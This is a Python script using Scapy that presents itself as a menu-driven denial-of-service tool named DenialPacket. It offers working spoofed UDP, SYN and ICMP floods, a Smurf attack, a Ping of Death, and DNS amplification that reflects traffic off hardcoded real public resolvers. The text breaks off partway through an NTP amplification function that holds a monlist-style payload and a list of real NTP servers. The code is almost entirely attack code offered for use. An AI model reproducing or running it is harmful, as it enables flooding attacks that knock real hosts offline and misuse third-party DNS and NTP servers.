#!/usr/bin/python3
#-*- coding: utf-8 -*-
# Developp by Sword
# Copyright Sword

import time
import os
from scapy.all import *

left = "\033[0;32mDenial\033[00m@\033[1;95mPacket\033[00m:~$ "
top = "\x1b]2;Connected to DenialPacket \x07"

sys.stdout.write(top)

banner = """\033[1;00m                                                 		
\033[0;32m▓█████▄ ▓█████  ███▄    █  ██▓ ▄▄▄       ██▓   \033[1;95m  ██▓███   ▄▄▄       ▄████▄   ██ ▄█▀▓█████▄▄▄█████▓
\033[0;32m▒██▀ ██▌▓█   ▀  ██ ▀█   █ ▓██▒▒████▄    ▓██▒   \033[1;95m ▓██░  ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀▓  ██▒ ▓▒
\033[0;32m░██   █▌▒███   ▓██  ▀█ ██▒▒██▒▒██  ▀█▄  ▒██░   \033[1;95m ▓██░ ██▓▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███  ▒ ▓██░ ▒░
\033[0;32m░▓█▄   ▌▒▓█  ▄ ▓██▒  ▐▌██▒░██░░██▄▄▄▄██ ▒██░   \033[1;95m ▒██▄█▓▒ ▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄░ ▓██▓ ░ 
\033[0;32m░▒████▓ ░▒████▒▒██░   ▓██░░██░ ▓█   ▓██▒░██████\033[1;95m▒▒██▒ ░  ░ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒ ▒██▒ ░ 
\033[0;32m ▒▒▓  ▒ ░░ ▒░ ░░ ▒░   ▒ ▒ ░▓   ▒▒   ▓▒█░░ ▒░▓  \033[1;95m░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░ ▒ ░░   
\033[0;32m ░ ▒  ▒  ░ ░  ░░ ░░   ░ ▒░ ▒ ░  ▒   ▒▒ ░░ ░ ▒  \033[1;95m░░▒ ░       ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░   ░    
\033[0;32m ░ ░  ░    ░      ░   ░ ░  ▒ ░  ░   ▒     ░ ░  \033[1;95m ░░         ░   ▒   ░        ░ ░░ ░    ░    ░      
\033[0;32m   ░       ░  ░         ░  ░        ░  ░    ░  \033[1;95m░               ░  ░░ ░      ░  ░      ░  ░ 
"""

helpBanner = """                     
\033[1;00m                 [+]═════════════════════════════════════════════════════════════[+]
\033[1;00m                  ║                     \033[0;32mDevelop \033[1;95mby Sword\033[1;00m                          ║
\033[1;00m                  ║                \033[1;00mhttps://github.com/SwordLoveDev                ║
\033[1;00m                 [+]═════════════════════════════════════════════════════════════[+]
\033[1;00m                  ║   \033[0;32mScript made with Scapy Module, please select your \033[1;95moption \033[1;95m:\033[00m  ║
\033[1;00m                 [+]═════════════════════════════════════════════════════════════[+]
\033[1;00m                  ║         \033[1;95m1 \033[0;32m= Spoof UDP flood\033[00m                                   ║
\033[1;00m                  ║         \033[1;95m2 \033[0;32m= Spoof SYN flood\033[00m                                   ║
\033[1;00m                  ║         \033[1;95m3 \033[0;32m= Spoof ICMP flood\033[00m                                  ║
\033[1;00m                  ║         \033[1;95m4 \033[0;32m= Smurf Attack (ICMP spoof to broadcast address)\033[00m    ║
\033[1;00m                  ║         \033[1;95m5 \033[0;32m= Ping of Death (Spoof request)\033[00m                     ║
\033[1;00m                  ║         \033[1;95m6 \033[0;32m= DNS Amplification\033[00m                                 ║
\033[1;00m                  ║         \033[1;95m7 \033[0;32m= NTP Amplification\033[00m                                 ║
\033[1;00m                  ║         \033[1;95m8 \033[0;32m= SNMP Amplification (Soon ...)\033[00m                     ║
\033[1;00m                  ║         \033[1;95m9 \033[0;32m= Exit the tool\033[00m                                     ║
\033[1;00m                 [+]═════════════════════════════════════════════════════════════[+]
"""

def udpSpoof():
    os.system("clear")
    print(banner)
    print("\033[1;00m                                             \033[1;95mUDP Spoof \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95mNone\033[1;00m                             ")
    print("\033[1;00m                                       \033[0;32mPort target : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    ipTarget = input("\n\033[0;32m Enter the \033[1;95mIP\033[0;32m of target:\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                             \033[1;95mUDP Spoof \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
    print("\033[1;00m                                       \033[0;32mPort target : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    port = input("\n\033[0;32m Enter the \033[1;95mport \033[0;32m:\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                             \033[1;95mUDP Spoof \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
    print("\033[1;00m                                       \033[0;32mPort target : \033[1;95m{}\033[1;00m                           ".format(port))
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    cons = input("\n\033[0;32m Enter the \033[1;95mcons \033[0;32m:\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                             \033[1;95mUDP Spoof \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
    print("\033[1;00m                                       \033[0;32mPort target : \033[1;95m{}\033[1;00m                           ".format(port))
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95m{}\033[1;00m                           ".format(cons))
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    choiceUdpSpoof = """
\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]
\033[1;00m                    ║   \033[0;32mPlease select your \033[1;95moption \033[1;95m:\033[00m                                 ║
\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]
\033[1;00m                    ║             \033[1;95m1 \033[0;32m= Random source Spoof \033[00m                          ║
\033[1;00m                    ║             \033[1;95m2 \033[0;32m= Specify your source Spoof \033[00m                    ║
\033[1;00m                    ║             \033[1;95m3 \033[0;32m= Wordlist with source Spood (soon ...) \033[00m        ║
\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]
    """
    print(choiceUdpSpoof)
    choice = input(left)
    if choice == "1":
        ip = IP(src = RandIP("0.0.0.0/0"), dst = ipTarget)
        udp = UDP(sport = RandShort(), dport = int(port))
    elif choice == "2":
        spoofIp = input("\n\033[0;32mEnter \033[1;95mSpoof IP\033[0;32m :\033[00m ")
        ip = IP(src = spoofIp, dst = ipTarget)
        udp = UDP(sport = RandShort(), dport = int(port))
    else : 
        print("\033[1;95mCommand Not Found !\033[00m")
        time.sleep(3)
        udpSpoof()
    start = input("\n\033[0;32mPress \033[1;95mCTRL+Z\033[0;32m for stop the attack !\n\033[0;32mPress \033[1;95mENTER\033[0;32m to start the attack ...\033[00m ")
    if start == "":
        print("\n\033[1;95mAttack Sent and in court !\033[00m")
        packet = Ether()/ip/udp
        sendpfast(packet*100, loop = int(cons))

def synSpoof():
    os.system("clear")
    print(banner)
    print("\033[1;00m                                             \033[1;95mTCP-SYN Spoof \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95mNone\033[1;00m                             ")
    print("\033[1;00m                                       \033[0;32mPort target : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    ipTarget = input("\n\033[0;32m Enter the \033[1;95mIP\033[0;32m of target:\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                             \033[1;95mTCP-SYN Spoof \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
    print("\033[1;00m                                       \033[0;32mPort target : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    port = input("\n\033[0;32m Enter the \033[1;95mport \033[0;32m:\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                             \033[1;95mTCP-SYN Spoof \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
    print("\033[1;00m                                       \033[0;32mPort target : \033[1;95m{}\033[1;00m                           ".format(port))
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    cons = input("\n\033[0;32m Enter the \033[1;95mcons \033[0;32m:\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                             \033[1;95mTCP-SYN Spoof \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
    print("\033[1;00m                                       \033[0;32mPort target : \033[1;95m{}\033[1;00m                           ".format(port))
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95m{}\033[1;00m                           ".format(cons))
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    choiceSynSpoof = """
\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]
\033[1;00m                    ║   \033[0;32mPlease select your \033[1;95moption \033[1;95m:\033[00m                                 ║
\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]
\033[1;00m                    ║             \033[1;95m1 \033[0;32m= Random source Spoof \033[00m                          ║
\033[1;00m                    ║             \033[1;95m2 \033[0;32m= Specify your source Spoof \033[00m                    ║
\033[1;00m                    ║             \033[1;95m3 \033[0;32m= Wordlist with source Spood (soon ...) \033[00m        ║
\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]
    """
    print(choiceSynSpoof)
    choice = input(left)
    if choice == "1":
        ip = IP(src = RandIP("0.0.0.0/0"), dst = ipTarget)
        tcp = TCP(sport=RandShort(), dport=int(port), flags="S")
    elif choice == "2":
        spoofIp = input("\n\033[0;32mEnter \033[1;95mSpoof IP\033[0;32m :\033[00m ")
        ip = IP(src = spoofIp, dst = ipTarget)
        tcp = TCP(sport=RandShort(), dport=int(port), flags="S")
    else : 
        print("\033[1;95mCommand Not Found !\033[00m")
        time.sleep(3)
        udpSpoof()
    start = input("\n\033[0;32mPress \033[1;95mCTRL+Z\033[0;32m for stop the attack !\n\033[0;32mPress \033[1;95mENTER\033[0;32m to start the attack ...\033[00m ")
    if start == "":
        print("\n\033[1;95mAttack Sent and in court !\033[00m")
        packet = Ether()/ip/tcp
        sendpfast(packet*100, loop = int(cons))

def icmpSpoof():
    os.system("clear")
    print(banner)
    print("\033[1;00m                                             \033[1;95mIMCP Spoof \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95mNone\033[1;00m                             ")
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    ipTarget = input("\n\033[0;32m Enter the \033[1;95mIP\033[0;32m of target:\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                             \033[1;95mIMCP Spoof \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    cons = input("\n\033[0;32m Enter the \033[1;95mcons \033[0;32m:\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                             \033[1;95mIMCP Spoof \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95m{}\033[1;00m                           ".format(cons))
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    choiceSynSpoof = """
\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]
\033[1;00m                    ║   \033[0;32mPlease select your \033[1;95moption \033[1;95m:\033[00m                                 ║
\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]
\033[1;00m                    ║             \033[1;95m1 \033[0;32m= Random source Spoof \033[00m                          ║
\033[1;00m                    ║             \033[1;95m2 \033[0;32m= Specify your source Spoof \033[00m                    ║
\033[1;00m                    ║             \033[1;95m3 \033[0;32m= Wordlist with source Spood (soon ...) \033[00m        ║
\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]
    """
    print(choiceSynSpoof)
    choice = input(left)
    if choice == "1":
        ip = IP(src = RandIP("0.0.0.0/0"), dst = ipTarget)
        ping = ICMP()
    elif choice == "2":
        spoofIp = input("\n\033[0;32mEnter \033[1;95mSpoof IP\033[0;32m :\033[00m ")
        ip = IP(src = spoofIp, dst = ipTarget)
        ping = ICMP()
    else : 
        print("\033[1;95mCommand Not Found !\033[00m")
        time.sleep(3)
        udpSpoof()
    start = input("\n\033[0;32mPress \033[1;95mCTRL+Z\033[0;32m for stop the attack !\n\033[0;32mPress \033[1;95mENTER\033[0;32m to start the attack ...\033[00m ")
    if start == "":
        print("\n\033[1;95mAttack Sent and in court !\033[00m")
        packet = Ether()/ip/ping
        sendpfast(packet*100, loop = int(cons))

def smurfAttack():
    os.system("clear")
    print(banner)
    print("\033[1;00m                                    \033[1;95mSumrf Attack\033[0;32m with ICMP spoof to broadcast \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95mNone\033[1;00m                             ")
    print("\033[1;00m                                       \033[0;32mBroadcast adress : \033[1;95mNone\033[1;00m                             ")
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    ipTarget = input("\n\033[0;32m Enter the \033[1;95mIP\033[0;32m of target:\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                    \033[1;95mSumrf Attack\033[0;32m with ICMP spoof to broadcast \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
    print("\033[1;00m                                       \033[0;32mBroadcast adress : \033[1;95mNone\033[1;00m                             ")
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    ipBroadcast = input("\n\033[0;32m Enter the \033[1;95mIP of broadcast \033[0;32m adress :\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                    \033[1;95mSumrf Attack\033[0;32m with ICMP spoof to broadcast \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
    print("\033[1;00m                                       \033[0;32mBroadcast adress :: \033[1;95m{}\033[1;00m                           ".format(ipBroadcast))
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    cons = input("\n\033[0;32m Enter the \033[1;95mcons \033[0;32m:\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                    \033[1;95mSumrf Attack\033[0;32m with ICMP spoof to broadcast \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
    print("\033[1;00m                                       \033[0;32mBroadcast adress : \033[1;95m{}\033[1;00m                           ".format(ipBroadcast))
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95m{}\033[1;00m                           ".format(cons))
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    ip = IP(src = ipTarget, dst = ipBroadcast)
    ping = ICMP()
    start = input("\n\033[0;32mPress \033[1;95mCTRL+Z\033[0;32m for stop the attack !\n\033[0;32mPress \033[1;95mENTER\033[0;32m to start the attack ...\033[00m ")
    if start == "":
        print("\n\033[1;95mAttack Sent and in court !\033[00m")
        packet = Ether()/ip/ping
        sendpfast(packet*100, loop = int(cons))

def pingOfDeath():
    message = "T"
    os.system("clear")
    print(banner)
    print("\033[1;00m                                             \033[1;95mPing of Death \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95mNone\033[1;00m                             ")
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    ipTarget = input("\n\033[0;32m Enter the \033[1;95mIP\033[0;32m of target:\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                             \033[1;95mPing of Death \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    cons = input("\n\033[0;32m Enter the \033[1;95mcons \033[0;32m:\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                             \033[1;95mPing of Death \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95m{}\033[1;00m                           ".format(cons))
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    choicePingOfDeath = """
\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]
\033[1;00m                    ║   \033[0;32mPlease select your \033[1;95moption \033[1;95m:\033[00m                                 ║
\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]
\033[1;00m                    ║             \033[1;95m1 \033[0;32m= Random source Spoof \033[00m                          ║
\033[1;00m                    ║             \033[1;95m2 \033[0;32m= Specify your source Spoof \033[00m                    ║
\033[1;00m                    ║             \033[1;95m3 \033[0;32m= Wordlist with source Spood (soon ...) \033[00m        ║
\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]
    """
    print(choicePingOfDeath)
    choice = input(left)
    if choice == "1":
        ip = IP(src = RandIP("0.0.0.0/0"), dst = ipTarget)
        ping = ICMP()
    elif choice == "2":
        spoofIp = input("\n\033[0;32mEnter \033[1;95mSpoof IP\033[0;32m :\033[00m ")
        ip = IP(src = spoofIp, dst = ipTarget)
        ping = ICMP()
    else : 
        print("\033[1;95mCommand Not Found !\033[00m")
        time.sleep(3)
        pingOfDeath()
    start = input("\n\033[0;32mPress \033[1;95mCTRL+Z\033[0;32m for stop the attack !\n\033[0;32mPress \033[1;95mENTER\033[0;32m to start the attack ...\033[00m ")
    if start == "":
        print("\n\033[1;95mAttack Sent and in court !\033[00m")
        packet = Ether()/ip/ping/message*60000
        sendpfast(packet*100, loop = int(cons))

def amplificationDns():
    serverdns = ["1.0.0.1","129.250.35.251","8.8.8.8","208.67.222.222","8.8.4.4","216.185.64.6","195.113.144.194","80.67.169.12","194.179.1.100","69.146.17.3"]
    os.system("clear")
    print(banner)
    print("\033[1;00m                                         \033[1;95mDNS Amplification \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95mNone\033[1;00m                             ")
    print("\033[1;00m                                       \033[0;32mPort target : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    ipTarget = input("\n\033[0;32m Enter the \033[1;95mIP\033[0;32m of target:\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                         \033[1;95mDNS Amplification \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
    print("\033[1;00m                                       \033[0;32mPort target : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    port = input("\n\033[0;32m Enter the \033[1;95mport \033[0;32m:\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                         \033[1;95mDNS Amplification \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
    print("\033[1;00m                                       \033[0;32mPort target : \033[1;95m{}\033[1;00m                           ".format(port))
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    cons = input("\n\033[0;32m Enter the \033[1;95mcons \033[0;32m:\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                         \033[1;95mDNS Amplification \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
    print("\033[1;00m                                       \033[0;32mPort target : \033[1;95m{}\033[1;00m                           ".format(port))
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95m{}\033[1;00m                           ".format(cons))
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    choiceDnsListe = """
\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]
\033[1;00m                    ║   \033[0;32mPlease select your \033[1;95moption \033[1;95m:\033[00m                                 ║
\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]
\033[1;00m                    ║           \033[1;95m1 \033[0;32m= Specify a DNS Resolver \033[00m                          ║
\033[1;00m                    ║           \033[1;95m2 \033[0;32m= Use default list of DNS resolver \033[00m                ║
\033[1;00m                    ║           \033[1;95m3 \033[0;32m= Wordlist with your list of DNS resolver \033[00m        ║
\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]
    """
    print(choiceDnsListe)
    choice = input(left)
    choice2 = input("\n\033[0;32mDo you wan't smooth attack for demo (\033[1;95mYes = 1 \033[0;32m/ \033[1;95mNo = 2\033[0;32m) :\033[00m ")
    cons = int(cons)
    if choice2 == "1":
        if choice == "1":
            dnsDestination = input("\n\033[0;32mEnter the \033[1;95mIP of DNS resolver \033[0;32m: \033[1;00m ")
            ip = IP(src = ipTarget, dst = dnsDestination)
            udp = UDP(dport = int(port))
            dns = DNS(rd = 1, qd = DNSQR(qname = "google.com", qtype = "ALL", qclass = "IN"), ar = DNSRROPT(rclass = 4096))
            start = input("\n\033[0;32mPress \033[1;95mCTRL+Z\033[0;32m for stop the attack !\n\033[0;32mPress \033[1;95mENTER\033[0;32m to start the attack ...\033[00m ")
            if start == "":
                print("\n\033[1;95mAttack Sent and in court !\033[00m")
                while cons != 0:
                    send(ip/udp/dns)
                    cons = cons - 1
        elif choice == "2":
            start = input("\n\033[0;32mPress \033[1;95mCTRL+Z\033[0;32m for stop the attack !\n\033[0;32mPress \033[1;95mENTER\033[0;32m to start the attack ...\033[00m ")
            if start == "":
                print("\n\033[1;95mAttack Sent and in court !\033[00m")
                while cons != 0:
                    cons = cons - 1
                    for server in range(len(serverdns)):
                        ip = IP(src = ipTarget, dst = serverdns[server])
                        udp = UDP(dport = int(port))
                        dns = DNS(rd = 1, qd = DNSQR(qname = "google.com", qtype = "ALL", qclass = "IN"), ar = DNSRROPT(rclass = 4096))
                        send(ip/udp/dns)
        else : 
            print("\033[1;95mCommand Not Found !\033[00m")
            time.sleep(3)
            udpSpoof()
    elif choice2 == "2":
        if choice == "1":
            dnsDestination = input("\n\033[0;32mEnter the \033[1;95mIP of DNS resolver \033[0;32m: \033[1;00m ")
            ip = IP(src = ipTarget, dst = dnsDestination)
            udp = UDP(dport = int(port))
            dns = DNS(rd = 1, qd = DNSQR(qname = "google.com", qtype = "ALL", qclass = "IN"), ar = DNSRROPT(rclass = 4096))
            start = input("\n\033[0;32mPress \033[1;95mCTRL+Z\033[0;32m for stop the attack !\n\033[0;32mPress \033[1;95mENTER\033[0;32m to start the attack ...\033[00m ")
            if start == "":
                print("\n\033[1;95mAttack Sent and in court !\033[00m")
                packet = Ether()/ip/udp/dns
                sendpfast(packet*100, loop = int(cons)) 
        elif choice == "2":
            start = input("\n\033[0;32mPress \033[1;95mCTRL+Z\033[0;32m for stop the attack !\n\033[0;32mPress \033[1;95mENTER\033[0;32m to start the attack ...\033[00m ")
            if start == "":
                print("\n\033[1;95mAttack Sent and in court !\033[00m")
                for server in range(len(serverdns)):    
                    ip = IP(src = ipTarget, dst = serverdns[serveur])
                    udp = UDP(dport = int(port))
                    dns = DNS(rd = 1, qd = DNSQR(qname = "google.com", qtype = "ALL", qclass = "IN"), ar = DNSRROPT(rclass = 4096))
                    packet = Ether()/ip/udp/dns
                    sendpfast(packet*100, loop = int(cons))
        else : 
            print("\033[1;95mCommand Not Found !\033[00m")
            time.sleep(3)
            udpSpoof()
    else : 
        print("\033[1;95mCommand Not Found !\033[00m")
        time.sleep(3)
        udpSpoof()

def amplificationNtp():
    serverntp = ["192.5.41.209","128.227.205.3","192.5.41.40","	50.205.244.108","68.54.100.49","70.35.196.28"]
    data = '\x17\x00\x03\x2a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    os.system("clear")
    print(banner)
    print("\033[1;00m                                         \033[1;95mNTP Amplification \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95mNone\033[1;00m                             ")
    print("\033[1;00m                                       \033[0;32mPort target : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    ipTarget = input("\n\033[0;32m Enter the \033[1;95mIP\033[0;32m of target:\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                         \033[1;95mNTP Amplification \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
    print("\033[1;00m                                       \033[0;32mPort target : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                                       \033[0;32mCons : \033[1;95mNone\033[1;00m                           ")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+]")
    port = input("\n\033[0;32m Enter the \033[1;95mport \033[0;32m:\033[00m ")
    os.system("clear")
    print(banner)
    print("\033[1;00m                                         \033[1;95mNTP Amplification \033[0;32mMethod")
    print("\033[1;00m                   [+]═════════════════════════════════════════════════════════════[+] ")
    print("\033[1;00m                                       \033[0;32mIP target : \033[1;95m{}\033[1;00m                             ".format(ipTarget))
